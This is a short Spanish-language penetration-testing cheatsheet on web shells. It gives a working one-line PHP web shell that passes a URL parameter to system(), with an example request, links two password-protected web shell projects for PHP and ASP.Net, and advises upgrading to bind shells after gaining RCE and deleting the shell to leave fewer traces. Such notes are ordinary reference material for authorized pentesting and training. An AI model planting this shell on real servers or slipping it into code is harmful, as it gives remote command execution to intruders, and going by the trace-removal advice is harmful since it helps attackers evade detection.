---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Penetration Test]]"
secondary categories:
  - "[[Pre-Exploitation]]"
tertiary categories:
  - "[[Payloads]]"
type: CheatSheet
linked:
---
# Web Shells

***

## Cheatsheet

| **Acción**                                                                                         | **Descripción**                                                                                                       |
| -------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `<?php echo system($_GET["cmd"]); ?>`<br><br>Uso: <br>`http://target.com/shell.php?cmd=id`<br><br> | Webshell PHP simple.<br><br>Sin ninguna protección por contraseña.                                                    |
| <br><br>https://github.com/0xDLB/Protected-PHP-Web-Shell                                           | Webshell PHP con protección por contraseña. <br>La contraseña está definida en la línea 11.<br><br>                   |
| <br>https://github.com/samratashok/nishang/tree/master/Antak-WebShell                              | Antak es una webshell para ASP.Net en objetivos Windows. <br><br>Usuario y contraseña están definidos en la línea 14. |

---

## Overview

Un **web shell** es una interfaz accesible desde el navegador que nos permite **ejecutar comandos** en el sistema operativo del servidor web.

**Algunas consideraciones importantes:**

- Algunas aplicaciones web **eliminan archivos automáticamente** después de un período determinado.
- Los **web shells** son **menos potentes** que las reverse shells.
- Es más probable que **dejen evidencia** del ataque.
- Si quedan sin protección, un web shell podría ser **accedido y usado por otra persona**.

Después de conseguir **RCE**, puede ser recomendable actualizar a [[Bind Shells]] para conseguir mayor capacidad y luego **eliminar el web shell** para reducir rastros.